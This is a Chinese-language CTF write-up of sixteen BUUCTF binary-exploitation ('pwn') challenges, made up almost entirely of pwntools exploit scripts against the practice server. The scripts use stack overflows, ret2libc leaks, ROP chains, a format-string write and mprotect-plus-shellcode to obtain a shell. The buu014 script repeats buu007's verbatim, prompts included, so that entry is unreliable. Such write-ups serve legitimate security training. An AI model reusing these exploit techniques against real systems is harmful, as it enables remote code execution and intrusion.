[BUUCTF网站](https://buuoj.cn/challenges)

笔者认为过于简单的题目会直接附上exp。
~~（不得不说buu的题目还挺多的）~~
零基础pwn萌新推荐先看这个：[视频](https://www.bilibili.com/video/BV1854y1y7Ro)

# buu001-test_your_nc
连上就行

# buu002-rip
```python
from pwn import *
context.log_level='debug'

# io = process('./pwn1')
io = remote('node4.buuoj.cn', 27534)

io.sendline(cyclic(15) + p64(0x401186))

io.interactive()
```
# buu003-warmup_csaw_2016
```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25377)

io.sendlineafter(b'>', cyclic(64+8) + p64(0x40060D))

io.interactive()
```
# buu004-ciscn_2019_n_1

```python
from pwn import *

# io = process("./pwn")
io = remote('node4.buuoj.cn', 26735)

io.sendlineafter(b'Let\'s guess the number', cyclic(44) + p32(0x41348000))

io.interactive()
```
# buu005-pwn1_sctf_2016
这道题是一个C++ pwn，但是逻辑不难理解，简单分析一下。下面是IDA反汇编的漏洞函数：
```cpp
int vuln()
{
  const char *v0; // eax
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
  char v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  char v4[7]; // [esp+40h] [ebp-18h] BYREF
  char v5; // [esp+47h] [ebp-11h] BYREF
  char v6[7]; // [esp+48h] [ebp-10h] BYREF
  char v7[5]; // [esp+4Fh] [ebp-9h] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);
  std::string::operator=(&input, s);
  std::allocator<char>::allocator(&v5);
  std::string::string(v4, "you", &v5);
  std::allocator<char>::allocator(v7);
  std::string::string(v6, "I", v7);
  replace((std::string *)v3);
  std::string::operator=(&input, v3, v6, v4);
  std::string::~string(v3);
  std::string::~string(v6);
  std::allocator<char>::~allocator(v7);
  std::string::~string(v4);
  std::allocator<char>::~allocator(&v5);
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(s, v0);
  return printf("So, %s\n", s);
}
```
这里重点关注"="和replace函数，这也是程序在栈内存中操作的重点。在调试过程中，那些``std::allocator<char>::allocator``的语句对栈区没有明显的影响，略过。经过手动反编译，还原出的源代码大致如下：
```cpp
#include <iostream>
#include <stdio.h>
#include <string.h>
using namespace std;
string input;

int vuln(){
	char info[32];
	printf("Tell me something about yourself: ");
	fgets(info, 32, stdin);
	input = info;
	string you = "you";
	string I = "I";
	rep = replace(input, you, I);	// replace "I" with "you"
	strcpy(info, rep.c_str());
}

int main(){
	vuln();
	return 0;
}
```
这个函数的功能是将info中所有的"I"换成"you"，replace函数甚至都无需分析。由此很容易看出这里有潜在的溢出问题。而且程序本身也给了后门，因此直接修改返回地址即可。
exp：
```python
from pwn import *
io = process('./pwn')
payload = b'I' * 20 + p32(0xdeadbeef) + p32(0x8048f0d)
io.sendline(payload)
io.interactive()
```
# buu006-jarvisoj_level0
```python
from pwn import *
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26344)
io.sendlineafter('Hello, World', cyclic(128+8) + p64(0x400596))
io.interactive()
```
# buu007-ciscn_2019_c_1
常规的获取got表地址，LibcSearcher有的时候可以有的时候不行，题目能给libc是最好的。
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25958)
elf = ELF('./pwn')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.33.so')

poprdi_ret = 0x400c83

payload = b'\x00' + cyclic(0x50+7)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols[b'main'])

io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
print(io.recv(12))

put_addr = u64(io.recv(6) + b'\x00\x00')
print(hex(put_addr))
libc = LibcSearcher('puts', put_addr)
libc_base = put_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

print(hex(sys_addr))
print(hex(binsh_addr))

payload = b'\x00' + cyclic(0x50+7)
payload += p64(0x4006b9)	# ret
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(sys_addr)

io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)

io.interactive()
```
# buu008-[第五空间2019 决赛]PWN5
```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28577)

payload = fmtstr_payload(10, {0x804C044: 0})
io.sendlineafter(b'your name:', payload)

io.sendline(b'0')
io.interactive()
```
# buu009-ciscn_2019_n_8

```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26497)
io.sendlineafter(b'What\'s your name?', cyclic(4 * 13) + p32(17))

io.interactive()
```
# buu010-jarvisoj_level2

```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29788)
elf = ELF('./pwn')

binsh_addr = 0x804a024

io.sendlineafter(b'Input:', cyclic(0x88) + p32(elf.symbols['main']) + p32(elf.plt['system']) + p32(binsh_addr) + p32(binsh_addr))

io.interactive()
```
# buu011-[OGeek2019]babyrop

```python
from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27628)
elf = ELF('./pwn')
exp = 0x8048825
ret = 0x8048502

io.send(b'\x00' + b'\xFF' * 0x1f)

payload = cyclic(0xe7 + 4)
payload += p32(elf.plt['puts'])
payload += p32(exp)
payload += p32(elf.got['read'])

io.sendlineafter(b'Correct\n', payload)
io.send(b'\x00' + b'\xFF' * 0x1f)
read = u32(io.recv(4))
libc = ELF('./libc-2.23.so')
base = read - libc.symbols['read']
sys = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))

payload = cyclic(0xe7 + 4)
payload += p32(sys)
payload += p32(binsh)
payload += p32(binsh)

io.sendlineafter(b'Correct\n', payload)

io.interactive()
```
# buu012-bjdctf_2020_babystack

```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27538)

elf = ELF('./pwn')

io.sendlineafter(b'length of your name:', b'1000')
io.sendlineafter(b'What\'s u name?', cyclic(0x10 + 8) + p64(elf.symbols['backdoor']))
io.interactive()
```
# buu013-get_started_3dsctf_2016
不知道为什么3dsctf里面不止一道题在挂exp脚本调试的时候recv收不到一开始发送的字符串，很奇怪，本来这一题直接返回到后门就好了，但是因为这个怪原因不得不用mprotect在其他地方再写一个shell，原来程序里面的后门就没用上 ~~（屑）~~
使用mprotect函数时传入的地址参数必须页对齐，size参数也必须是页的整数倍。权限填7表示可读可写可执行。本题中要修改的主要是下面这个页的属性，然后shellcode写在.got.plt段中，尝试修改bss段，写在bss段发现不行，可能是bss段中有一些重要数据之类。
![](https://img-blog.csdnimg.cn/b6188cbaf1d841cba169b5a8872f551b.png)
exp：
```python
from pwn import *
import time
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29364)
elf = ELF('./pwn')
mprotect = elf.symbols['mprotect']
start = 0x80eb000
length = 0x1000
bss = 0x803bf80
pop3 = 0x0809e4c5

payload = cyclic(0x38)
payload += p32(mprotect)
payload += p32(pop3)
payload += p32(start)
payload += p32(length)
payload += p32(7)
payload += p32(elf.symbols['read'])
payload += p32(pop3)
payload += p32(0)	# stdin
payload += p32(start)
payload += p32(0x80)
payload += p32(start)
# gdb.attach(io)
io.sendline(payload)

time.sleep(0.5)
io.sendline(asm(shellcraft.sh()))

io.interactive()
```
# buu014-ciscn_2019_en_2
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25743)
elf = ELF('./pwn')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.33.so')

poprdi_ret = 0x400c83

payload = b'\x00' + cyclic(0x50+7)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols[b'main'])

io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
print(io.recv(12))

put_addr = u64(io.recv(6) + b'\x00\x00')
print(hex(put_addr))
libc = LibcSearcher('puts', put_addr)
libc_base = put_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

print(hex(sys_addr))
print(hex(binsh_addr))

payload = b'\x00' + cyclic(0x50+7)
payload += p64(0x4006b9)	# ret
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(sys_addr)

io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)

io.interactive()
```
# buu015-[HarekazeCTF2019]baby_rop

```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28394)
elf = ELF('./pwn')

binsh_addr = 0x600a90
poprdi_ret = 0x4006b3

io.sendlineafter(b'Input:', cyclic(0x88) + p64(poprdi_ret) + p64(binsh_addr) + p64(elf.plt['system']))

io.interactive()
```
# buu016-jarvisoj_level2_x64
```python
from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25723)
elf = ELF('./pwn')

poprdi_ret = 0x400683
binsh = 0x601048

io.sendlineafter(b'What\'s your name? ', cyclic(0x18) + p64(poprdi_ret) + p64(binsh) + p64(elf.plt['system']))

io.interactive()
```
